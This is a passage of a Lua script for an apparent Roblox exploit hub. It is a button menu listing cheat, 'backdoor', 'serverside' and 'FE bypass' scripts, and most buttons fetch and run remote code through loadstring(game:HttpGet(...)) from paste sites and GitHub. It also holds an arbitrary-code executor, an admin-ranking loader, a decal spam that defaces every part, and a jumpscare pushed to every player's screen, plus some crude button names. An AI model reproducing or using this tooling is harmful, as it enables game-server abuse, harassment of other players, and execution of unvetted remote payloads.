coroutine.wrap(COROTINE)()
end)
AddButton(SPage2, "Backdoor V8.0.0", X3Y6)
AddButton(SPage2, "Infinite SS", X4Y6)
AddButton(SPage2, "C00lkiddisKingNow Executor", X1Y7, function()
setclipboard("key_43568792")
local Msg = Instance.new("Message", workspace)
Msg.Text = "The key has been Copied to your Clipboard"
wait(3)
Msg:Destroy()
wait(4)
loadstring(game:HttpGet("https://pastebin.com/raw/CQUMRJR3"))()
end)
AddButton(SPage2, "Dex", X2Y7)
AddButton(SPage2, "FE 1x1x1x1 Gui", X3Y7, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GRAVEBUSTER0/GRAVEBUSTER0/main/New.lua"))()
end)
AddButton(SPage2, "Spectral Archer", X4Y7)

AddButton(SPage3, "Fencing", X1Y1)
AddButton(SPage3, "Private gui by DimasGGrtrt9", X2Y1)
AddButton(SPage3, "Private gui by Fancykid", X3Y1, function()
loadstring(game:HttpGet("https://pastefy.app/eQA7OWqN/raw"))()
end)
AddButton(SPage3, "Project Lua", X4Y1)
AddButton(SPage3, "Backdoor V6X", X1Y2)
AddButton(SPage3, "Supra SS", X2Y2)
AddButton(SPage3, "FE Polaria", X3Y2)
AddButton(SPage3, "Private gui by Decomplier660 and LIONARCH_HELON", X4Y2, function()
--Private gui by Decomplier660 and LIONARCH_HELON its Private >:(
local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/WRUyYTdY')))()

--Example
--Tab:AddButton({
--    Name = "Name",
--    Callback = function()
--		script Here
--  end    
--})

local Window = OrionLib:MakeWindow({
    Name = "Private gui by Decomplier660 and LIONARCH_HELON",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "PrivateGuiBySigma" -- Put the name of your hub or script here!
})

--Tab 1
local Tab = Window:MakeTab({
    Name = "Scripts",
    Icon = "rbxasset://133168176300761",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "R15 to R6 [FE]",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()
  end    
})



Tab:AddButton({
    Name = "HD Admin Ranker",
    Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/PHG8Skj0"))()
  end    
})

Tab:AddButton({
    Name = "Exser SS",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw",true))()
  end    
})

Tab:AddButton({
    Name = "Pipebomb Launcher",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/PipeBomb%20Launcher.txt"))()
  end    
})

Tab:AddButton({
    Name = "Devesto Decal Spam",
    Callback = function()
		local Image = "rbxassetid://133168176300761"

for i, v in pairs(workspace:GetDescendants()) do
	if v:IsA("Part") then
		local Decal1 = Instance.new("Decal", v)
		Decal1.Texture = Image
		Decal1.Face = "Top"
		local Decal2 = Instance.new("Decal", v)
		Decal2.Texture = Image
		Decal2.Face = "Bottom"
		local Decal3 = Instance.new("Decal", v)
		Decal3.Texture = Image
		Decal3.Face = "Front"
		local Decal4 = Instance.new("Decal", v)
		Decal4.Texture = Image
		Decal4.Face = "Back"
		local Decal5 = Instance.new("Decal", v)
		Decal5.Texture = Image
		Decal5.Face = "Left"
		local Decal6 = Instance.new("Decal", v)
		Decal6.Texture = Image
		Decal6.Face = "Right"
	end
end

for i = 1, math.random(1, 3) do
	print(i)
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local Particle = Instance.new("ParticleEmitter")
			Particle.Parent = v
			Particle.Texture = Image
		end
	end
end

local Skybox = Instance.new("Sky", game.Lighting)
Skybox.SkyboxBk = Image
Skybox.SkyboxDn = Image
Skybox.SkyboxFt = Image
Skybox.SkyboxLf = Image
Skybox.SkyboxRt = Image
Skybox.SkyboxUp = Image
  end    
})

Tab:AddButton({
    Name = "Devesto Jumpscare",
    Callback = function()
		local gui = Instance.new("ScreenGui", nil)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.SafeAreaCompatibility = "None"
gui.ScreenInsets = "None"
gui.ClipToDeviceSafeArea = true
gui.Name = "JumpscareByLion"
gui.DisplayOrder = 2147483647

local image = Instance.new("ImageLabel", gui)
image.Size = UDim2.new(1, 0, 1)
image.Active = true
image.BackgroundColor3 = Color3.new(0, 0, 0)
image.Image = "rbxassetid://133168176300761"
image.ZIndex = 9999

function ActiveJumpscare()
for i, A in pairs(game.Players:GetDescendants()) do
    if A:IsA("PlayerGui") then
        gui:Clone().Parent = A
    end
end
wait(5)
for z, A in pairs(game.Players:GetDescendants()) do
   if A:IsA("PlayerGui") then
      A:FindFirstChild("JumpscareByLion"):Destroy()
  end
end
end

ActiveJumpscare()
  end    
})

Tab:AddButton({
    Name = "Topk3k V5.0",
    Callback = function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/radiuscool/topkek/refs/heads/main/adsdsaadsdassad'))()
  end    
})

Tab:AddButton({
    Name = "Red sword Pickaxe",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Red%20Sword%20Pickaxe.txt"))()
  end    
})

Tab:AddButton({
    Name = "Domminant V5.0.1",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/dominat501.txt"))()
  end    
})

Tab:AddButton({
    Name = "Disco",
    Callback = function()
		local function LOOL()
		local script = Instance.new("LocalScript", nil)
		
		while task.wait() do
			for i, v in pairs(workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.Color = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
				end
			end
		end
	end
	coroutine.wrap(LOOL)()
  end    
})

Tab:AddButton({
    Name = "Grandosla",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/Kql9VClT/raw"))()
  end    
})

Tab:AddButton({
    Name = "Grab Knife V3",
    Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-grab-knife-v3-9232"))()
  end    
})

Tab:AddButton({
    Name = "Project Megma V4",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/GiEm6AH8/raw"))()
  end    
})

Tab:AddButton({
    Name = "Clockwood Arena",
    Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/NNp1NJKT"))()
  end    
})

Tab:AddButton({
    Name = "Kitchen gun",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/rare/refs/heads/main/kitcher%20gun.lua"))()
  end    
})

Tab:AddButton({
    Name = "Sledge Hammer",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/jmJgSbvV/raw?part=Sledgehammer", true))()
  end    
})

Tab:AddButton({
    Name = "Excavator",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/q74DFYYz/raw", true))()
  end    
})

Tab:AddButton({
    Name = "Primadon",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/1XDb5hJe/raw"))()
  end    
})

Tab:AddButton({
    Name = "Project Local",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/kZ8pJbsp/raw"))()
  end    
})

Tab:AddButton({
    Name = "Rc7 (SS)",
    Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/2GCB3P3t"))()
  end    
})

Tab:AddButton({
    Name = "Gonet",
    Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Goner-47954"))()
  end    
})

Tab:AddButton({
    Name = "Green Tank",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Idkkk/refs/heads/main/Green%20Tank.txt"))()
  end    
})

Tab:AddButton({
    Name = "Project Local",
    Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/kZ8pJbsp/raw"))()
  end    
})
end)
AddButton(SPage3, "Stigma Ultimate", X1Y3)
AddButton(SPage3, "Private gui by Polemenus", X2Y3)
AddButton(SPage3, "Steve", X3Y3, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/tubers93's-Place-Number:-1-steve-38109"))()
end)
AddButton(SPage3, "Project Megma V2", X4Y3, function()
loadstring(game:HttpGet("https://pastefy.app/GiEm6AH8/raw"))()
end)
AddButton(SPage3, "Seasola", X1Y4, function()
loadstring(game:HttpGet("https://pastefy.app/1CgQx30m/raw"))()
end)
AddButton(SPage3, "Private gui by StigmaDude", X2Y4, function()
loadstring(game:HttpGet("https://pastebin.com/raw/DxMwPkXH"))()
end)
AddButton(SPage3, "External Gui1!1!1", X3Y4, function()

end)
AddButton(SPage3, "Grab Knife V4", X4Y4)
AddButton(SPage3, "Ultimate Trolling Gui by GrizzlyBear", X1Y5)
AddButton(SPage3, "John Doe", X2Y5)
AddButton(SPage3, "Epic SS", X3Y5)
AddButton(SPage3, "External Haxx Executor", X4Y5)
AddButton(SPage3, "Bomb Vest V2", X1Y6, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ProBypasserHax1/Ussjzbwusbdlq/refs/heads/main/Luafile33Xc3eww"))()
end)
AddButton(SPage3, "John doe ServerSide", X2Y6)
AddButton(SPage3, "Project Ligma", X3Y6)
AddButton(SPage3, "FE Hax gui V2", X4Y6, function()
loadstring(game:HttpGet("https://pastebin.com/raw/gr3XZwUY"))()
end)
AddButton(SPage3, "Primadon", X1Y7, function()
loadstring(game:HttpGet("https://pastefy.app/1XDb5hJe/raw"))()
end)
AddButton(SPage3, "Project Local", X2Y7, function()
loadstring(game:HttpGet("https://pastefy.app/kZ8pJbsp/raw"))()
end)
AddButton(SPage3, "Clockworld Arena", X3Y7, function()
loadstring(game:HttpGet("https://pastebin.com/raw/NNp1NJKT"))()
end)
AddButton(SPage3, "Private gui by Davin", X4Y7)

AddButton(SPage4, "Kitchen Gun", X1Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/rare/refs/heads/main/kitcher%20gun.lua"))()
end)
AddButton(SPage4, "Vereus", X2Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/fLrx77PM.txt"))()
end)
AddButton(SPage4, "LAL0L Hub", X3Y1, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
end)
AddButton(SPage4, "SF Executor", X4Y1, function()
loadstring(game:HttpGet("https://pastefy.app/xj9lkBIv/raw"))()
end)
AddButton(SPage4, "Converted SSP", X1Y2, function()

end)
AddButton(SPage4, "Project Shiba", X2Y2, function()
loadstring(game:HttpGet("https://pastebin.com/raw/HrE2dKSD"))()
end)
AddButton(SPage4, "9/11 Plane", X3Y2, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/refs/heads/main/%5BRecharacter%5D%20911%20Plane"))()
end)
AddButton(SPage4, "Slegde Hammer", X4Y2, function()
loadstring(game:HttpGet("https://pastefy.app/jmJgSbvV/raw?part=Sledgehammer", true))()
end)
AddButton(SPage4, "Excavator", X1Y3, function()
loadstring(game:HttpGet("https://pastefy.app/q74DFYYz/raw", true))()
end)
AddButton(SPage4, "Rainbow", X2Y3, function()
local char = player.Character or player.CharacterAdded:Wait()
    local running = true

    task.spawn(function()
        while running do
            for h = 0, 1, 0.02 do
                local color = Color3.fromHSV(h, 1, 1)
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.Color = color
                        part.Material = Enum.Material.Neon
                    end
                end
                task.wait(0.05)
            end
        end
    end)
end)
AddButton(SPage4, "Project BrokenSpawn102", X3Y3, function()
local elysian = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local execute = Instance.new("TextButton")

local clear = Instance.new("TextButton")

local outputContainer = Instance.new("ScrollingFrame")

local output = Instance.new("TextLabel")

local TextLabel = Instance.new("TextLabel")

local image = Instance.new("ImageLabel")

local TextBox = Instance.new("TextBox")

local elysian_2 = Instance.new("TextButton")

local view = Instance.new("TextButton")

local scriptlist = Instance.new("ScrollingFrame")

local blue = Instance.new("TextButton")

local infyield = Instance.new("TextButton")

local skid = Instance.new("TextButton")

local c00lgui = Instance.new("TextButton")

local Dex = Instance.new("TextButton")

local R6 = Instance.new("TextButton")

local jumscare = Instance.new("TextButton")

local ExSeR = Instance.new("TextButton")

local segma = Instance.new("TextButton")

local Goner = Instance.new("TextButton")

local Console = Instance.new("TextButton")

local primadon = Instance.new("TextButton")

local allah = Instance.new("TextButton")

local Exvator = Instance.new("TextButton")

local Thomas = Instance.new("TextButton")

local Spectrumglitcher = Instance.new("TextButton")

local Game = Instance.new("TextButton")

local Sledgehammer = Instance.new("TextButton")

local Face = Instance.new("TextButton")

elysian.Name = "elysian"

elysian.Parent = game.CoreGui

Frame.Parent = elysian

Frame.Active = true

Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Frame.Position = UDim2.new(0.236403197, 0, 0.1433869, 0)

Frame.Size = UDim2.new(0, 627, 0, 381)

Frame.Draggable = true

execute.Name = "execute"

execute.Parent = Frame

execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

execute.Position = UDim2.new(0.0159489624, 0, 0.685039341, 0)

execute.Size = UDim2.new(0, 137, 0, 27)

execute.Font = Enum.Font.SourceSans

execute.Text = "Execute"

execute.TextColor3 = Color3.fromRGB(0, 0, 0)

execute.TextSize = 14.000

execute.MouseButton1Click:Connect(function()

local code = TextBox.Text

    if code and code ~= "" then

        local success, err = pcall(function()

            loadstring(code)()

        end)

        if not success then

            output.Text = "Error: " .. err

        else

            output.Text = "script executed successfully!"

        end

    else

        output.Text = "Please enter a script to execute."

    end

end)

clear.Name = "clear"

clear.Parent = Frame

clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

clear.Position = UDim2.new(0.0159489624, 0, 0.790026248, 0)

clear.Size = UDim2.new(0, 137, 0, 23)

clear.Font = Enum.Font.SourceSans

clear.Text = "Clear"

clear.TextColor3 = Color3.fromRGB(0, 0, 0)

clear.TextSize = 14.000

clear.MouseButton1Click:Connect(function()

    TextBox.Text = ""

    output.Text = "Output cleared."

end)

outputContainer.Parent = Frame

outputContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

outputContainer.Position = UDim2.new(0.248803824, 0, 0.669291317, 0)

outputContainer.Size = UDim2.new(0, 326, 0, 116)

outputContainer.ScrollBarThickness = 13

outputContainer.CanvasSize = UDim2.new(0, 0, 0, 200)

outputContainer.VerticalScrollBarInset = Enum.ScrollBarInset.Always

output.Parent = outputContainer

output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

output.Size = UDim2.new(1, 0, 1, 0)

output.Font = Enum.Font.SourceSans

output.Text = "Hmm"

output.TextColor3 = Color3.fromRGB(0, 0, 0)

output.TextSize = 14.000

output.TextWrapped = true

output.TextXAlignment = Enum.TextXAlignment.Left

output.TextYAlignment = Enum.TextYAlignment.Top

TextLabel.Parent = Frame

TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

TextLabel.BorderSizePixel = 2

TextLabel.Position = UDim2.new(0.047846891, 0, 0, 0)

TextLabel.Size = UDim2.new(0, 597, 0, 22)

TextLabel.Font = Enum.Font.SourceSans

TextLabel.Text = "Project broken spawn102"

TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)

TextLabel.TextSize = 14.000

TextLabel.TextXAlignment = Enum.TextXAlignment.Left

image.Name = "image"

image.Parent = Frame

image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

image.BorderSizePixel = 0

image.Size = UDim2.new(0, 23, 0, 22)

image.Image = "rbxassetid://"

TextBox.Parent = Frame

TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

TextBox.Position = UDim2.new(0.0159489624, 0, 0.144356951, 0)

TextBox.Size = UDim2.new(0, 464, 0, 193)

TextBox.ClearTextOnFocus = false

TextBox.Font = Enum.Font.SourceSans

TextBox.MultiLine = true

TextBox.Text = "Run executor"

TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)

TextBox.TextSize = 14.000

TextBox.TextXAlignment = Enum.TextXAlignment.Left

TextBox.TextYAlignment = Enum.TextYAlignment.Top

elysian_2.Name = "elysian"

elysian_2.Parent = Frame

elysian_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

elysian_2.BorderSizePixel = 0

elysian_2.Position = UDim2.new(0, 0, 0.076115489, 0)

elysian_2.Size = UDim2.new(0, 88, 0, 18)

elysian_2.Font = Enum.Font.SourceSans

elysian_2.Text = "Execator"

elysian_2.TextColor3 = Color3.fromRGB(0, 0, 0)

elysian_2.TextSize = 14.000

scriptlist.Name = "scriptlist"

scriptlist.Parent = Frame

scriptlist.Active = true

scriptlist.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

scriptlist.Position = UDim2.new(0.768740058, 0, 0.144356951, 0)

scriptlist.Size = UDim2.new(0, 145, 0, 316)

scriptlist.HorizontalScrollBarInset = Enum.ScrollBarInset.Always

scriptlist.ScrollBarThickness = 13

infyield.Name = "infyield"

infyield.Parent = scriptlist

infyield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

infyield.Position = UDim2.new(0, 0, -0.000480845018, 0)

infyield.Size = UDim2.new(0, 132, 0, 23)

infyield.Font = Enum.Font.SourceSans

infyield.Text = "R6.txt"

infyield.TextColor3 = Color3.fromRGB(0, 0, 0)

infyield.TextSize = 14.000

infyield.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()

end)

skid.Name = "skid"

skid.Parent = scriptlist

skid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

skid.Position = UDim2.new(0, 0, 0.0297028814, 0)

skid.Size = UDim2.new(0, 132, 0, 23)

skid.Font = Enum.Font.SourceSans

skid.Text = "Re.txt"

skid.TextColor3 = Color3.fromRGB(0, 0, 0)

skid.TextSize = 14.000

skid.MouseButton1Click:Connect(function() 

if game.Players.LocalPlayer.Character then

game.Players.LocalPlayer.Character.Humanoid.Health = 0

end

end)

c00lgui.Name = "c00lgui"

c00lgui.Parent = scriptlist

c00lgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

c00lgui.Position = UDim2.new(0, 0, 0.0598866083, 0)

c00lgui.Size = UDim2.new(0, 132, 0, 23)

c00lgui.Font = Enum.Font.SourceSans

c00lgui.Text = "C00lgui reborn.txt"

c00lgui.TextColor3 = Color3.fromRGB(0, 0, 0)

c00lgui.TextSize = 14.000

c00lgui.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://rawscripts.net/raw/RetroStudio-ssssssssssssssss-11010"))()

end)

Dex.Name = "Dex"

Dex.Parent = scriptlist

Dex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Dex.Position = UDim2.new(0, 0, 0.0900703371, 0)

Dex.Size = UDim2.new(0, 132, 0, 23)

Dex.Font = Enum.Font.SourceSans

Dex.Text = "Rainbow.txt"

Dex.TextColor3 = Color3.fromRGB(0, 0, 0)

Dex.TextSize = 14.000

Dex.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://pastefy.app/FEb1EkVb/raw"))()

end)

blue.Name = "blue"

blue.Parent = scriptlist

blue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

blue.Position = UDim2.new(0, 0, 0.120254062, 0)

blue.Size = UDim2.new(0, 132, 0, 23)

blue.Font = Enum.Font.SourceSans

blue.Text = "topkek.txt"

blue.TextColor3 = Color3.fromRGB(0, 0, 0)

blue.TextSize = 14.000

blue.MouseButton1Click:Connect(function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/radiuscool/topkek/refs/heads/main/adsdsaadsdassad'))()

end)

jumscare.Name = "jumscare"

jumscare.Parent = scriptlist

jumscare.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

jumscare.Position = UDim2.new(0, 0, 0.0, 117)

jumscare.Size = UDim2.new(0, 132, 0, 23)

jumscare.Font = Enum.Font.SourceSans

jumscare.Text = "grandosla.txt"

jumscare.TextColor3 = Color3.fromRGB(0, 0, 0)

jumscare.TextSize = 14.000

jumscare.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastefy.app/Kql9VClT/raw"))()

end)

ExSeR.Name = "ExSeR"

ExSeR.Parent = scriptlist

ExSeR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

ExSeR.Position = UDim2.new(0, 0, 0.0, 140)

ExSeR.Size = UDim2.new(0, 132, 0, 23)

ExSeR.Font = Enum.Font.SourceSans

ExSeR.Text = "ExSeR.txt"

ExSeR.TextColor3 = Color3.fromRGB(0, 0, 0)

ExSeR.TextSize = 14.000

ExSeR.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw",true))()

end)

segma.Name = "segma"

segma.Parent = scriptlist

segma.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

segma.Position = UDim2.new(0, 0, 0.0, 163)

segma.Size = UDim2.new(0, 132, 0, 23)

segma.Font = Enum.Font.SourceSans

segma.Text = "segma_1.txt"

segma.TextColor3 = Color3.fromRGB(0, 0, 0)

segma.TextSize = 14.000

segma.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastebin.com/raw/tE127sKS"))()

end)

Goner.Name = "Goner"

Goner.Parent = scriptlist

Goner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Goner.Position = UDim2.new(0, 0, 0.0, 185)

Goner.Size = UDim2.new(0, 132, 0, 23)

Goner.Font = Enum.Font.SourceSans

Goner.Text = "Goner.txt"

Goner.TextColor3 = Color3.fromRGB(0, 0, 0)

Goner.TextSize = 14.000

Goner.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastebin.com/raw/XfdV4CCN"))()

end)

Console.Name = "Console"

Console.Parent = Frame

Console.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Console.Position = UDim2.new(0.0159489624, 0, 0.685039341, 80)

Console.Size = UDim2.new(0, 137, 0, 27)

Console.Font = Enum.Font.SourceSans

Console.Text = "Console"

Console.TextColor3 = Color3.fromRGB(0, 0, 0)

Console.TextSize = 14.000

Console.MouseButton1Click:Connect(function()

game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)

end)

primadon.Name = "primadon"

primadon.Parent = scriptlist

primadon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

primadon.Position = UDim2.new(0, 0, 0.0, 209)

primadon.Size = UDim2.new(0, 132, 0, 23)

primadon.Font = Enum.Font.SourceSans

primadon.Text = "primadon.txt"

primadon.TextColor3 = Color3.fromRGB(0, 0, 0)

primadon.TextSize = 14.000

primadon.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastefy.app/1XDb5hJe/raw"))()

end)

allah.Name = "allah"

allah.Parent = scriptlist

allah.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

allah.Position = UDim2.new(0, 0, 0.0, 235)

allah.Size = UDim2.new(0, 132, 0, 23)

allah.Font = Enum.Font.SourceSans

allah.Text = "allah.txt"

allah.TextColor3 = Color3.fromRGB(0, 0, 0)

allah.TextSize = 14.000

allah.MouseButton1Click:Connect(function() loadstring(game:HttpGet("https://pastebin.com/raw/NNp1NJKT"))()

end)

Exvator.Name = "Exvator"

Exvator.Parent = scriptlist

Exvator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Exvator.Position = UDim2.new(0, 0, 0.0, 259)

Exvator.Size = UDim2.new(0, 132, 0, 23)

Exvator.Font = Enum.Font.SourceSans

Exvator.Text = "Exvator.txt"

Exvator.TextColor3 = Color3.fromRGB(0, 0, 0)

Exvator.TextSize = 14.000

Exvator.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://pastefy.app/q74DFYYz/raw", true))()

end)

Thomas.Name = "Thomas"

Thomas.Parent = scriptlist

Thomas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Thomas.Position = UDim2.new(0, 0, 0.0, 260)

Thomas.Size = UDim2.new(0, 132, 0, 23)

Thomas.Font = Enum.Font.SourceSans

Thomas.Text = "Thomas.txt"

Thomas.TextColor3 = Color3.fromRGB(0, 0, 0)

Thomas.TextSize = 14.000

Thomas.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Thomas%20The%20Dank%20Engine.txt"))()

end)

Spectrumglitcher.Name = "Spectrum glitcher"

Spectrumglitcher.Parent = scriptlist

Spectrumglitcher.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Spectrumglitcher.Position = UDim2.new(0, 0, 0.0, 285)

Spectrumglitcher.Size = UDim2.new(0, 132, 0, 23)

Spectrumglitcher.Font = Enum.Font.SourceSans

Spectrumglitcher.Text = "Spectrum glitcher.txt"

Spectrumglitcher.TextColor3 = Color3.fromRGB(0, 0, 0)

Spectrumglitcher.TextSize = 14.000

Spectrumglitcher.MouseButton1Click:Connect(function()

game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Credit to ANTI_SKID (Enjoy my script :3)")

task.wait(3)

loadstring(game:HttpGet("https://rawscripts.net/raw/Just-a-baseplate.-Just-A-Baseplate-Working-Reanimation-39126"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/SCPECTRUMGLITCHER/refs/heads/main/SpectrumG%20(1).txt"))()

game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Those who claims its your script, i dont like you.")

end)

Game.Name = "Game"

Game.Parent = scriptlist

Game.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Game.Position = UDim2.new(0, 0, 0.0, 309)

Game.Size = UDim2.new(0, 132, 0, 23)

Game.Font = Enum.Font.SourceSans

Game.Text = "Broken spawn Game.txt"

Game.TextColor3 = Color3.fromRGB(0, 0, 0)

Game.TextSize = 14.000

Game.MouseButton1Click:Connect(function()

local TeleportService = game:GetService("TeleportService")

local Players = game:GetService("Players")

local player = Players.LocalPlayer

local placeId = 134279011762741

TeleportService:Teleport(placeId, player)

end)

Sledgehammer.Name = "Sledgehammer"

Sledgehammer.Parent = scriptlist

Sledgehammer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Sledgehammer.Position = UDim2.new(0, 0, 0.0, 330)

Sledgehammer.Size = UDim2.new(0, 132, 0, 23)

Sledgehammer.Font = Enum.Font.SourceSans

Sledgehammer.Text = "Sledgehammer.txt"

Sledgehammer.TextColor3 = Color3.fromRGB(0, 0, 0)

Sledgehammer.TextSize = 14.000

Sledgehammer.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://pastefy.app/jmJgSbvV/raw?part=Sledgehammer", true))()

end)

Face.Name = "Face"

Face.Parent = scriptlist

Face.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Face.Position = UDim2.new(0, 0, 0.0, 355)

Face.Size = UDim2.new(0, 132, 0, 23)

Face.Font = Enum.Font.SourceSans

Face.Text = "Face all.txt"

Face.TextColor3 = Color3.fromRGB(0, 0, 0)

Face.TextSize = 14.000

Face.MouseButton1Click:Connect(function()

loadstring(game:HttpGet("https://pastefy.app/Dej632d9/raw"))()

end)
end)
AddButton(SPage4, "Devesto Decal Spam", X4Y3, function()
local Image = "rbxassetid://133168176300761"

for i, v in pairs(workspace:GetDescendants()) do
	if v:IsA("Part") then
		local Decal1 = Instance.new("Decal", v)
		Decal1.Texture = Image
		Decal1.Face = "Top"
		local Decal2 = Instance.new("Decal", v)
		Decal2.Texture = Image
		Decal2.Face = "Bottom"
		local Decal3 = Instance.new("Decal", v)
		Decal3.Texture = Image
		Decal3.Face = "Front"
		local Decal4 = Instance.new("Decal", v)
		Decal4.Texture = Image
		Decal4.Face = "Back"
		local Decal5 = Instance.new("Decal", v)
		Decal5.Texture = Image
		Decal5.Face = "Left"
		local Decal6 = Instance.new("Decal", v)
		Decal6.Texture = Image
		Decal6.Face = "Right"
	end
end

for i = 1, math.random(1, 3) do
	print(i)
	for i, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Part") then
			local Particle = Instance.new("ParticleEmitter")
			Particle.Parent = v
			Particle.Texture = Image
		end
	end
end

local Skybox = Instance.new("Sky", game.Lighting)
Skybox.SkyboxBk = Image
Skybox.SkyboxDn = Image
Skybox.SkyboxFt = Image
Skybox.SkyboxLf = Image
Skybox.SkyboxRt = Image
Skybox.SkyboxUp = Image
end)
AddButton(SPage4, "Project Privated V2", X1Y4)
AddButton(SPage4, "Project Privated V6", X2Y4)
AddButton(SPage4, "Project Privated V8", X3Y4)
AddButton(SPage4, "Project U53RDV_7283", X4Y4)
AddButton(SPage4, "Play Bypassed Song Theme", X1Y5, function()
	local Sound = Instance.new("Sound", game:GetService("SoundService"))
	Sound.Name = "Nope"
	Sound.SoundId = "rbxassetid://84365625129267"
	Sound.Looped = true
	Sound.PlaybackSpeed = 0.17
	Sound.Volume = 10
	Sound:Play()
end)
AddButton(SPage4, "Big Smoke", X2Y5, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/refs/heads/main/%5BRecharacter%5D%20Big%20Smoke"))()
end)
AddButton(SPage4, "Robot", X3Y5, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Robot-LUA-49167"))()
end)
AddButton(SPage4, "Clown Kiddnap", X4Y5, function()
loadstring(game:HttpGet("https://pastebin.com/raw/vP2D2vnC"))()
end)
AddButton(SPage4, "require Loader", X1Y6, function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Serverside-or-fe-bypass-for-free-47095"))()
end)
AddButton(SPage4, "FE Admin Commands", X2Y6, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/main.lua"))()
end)
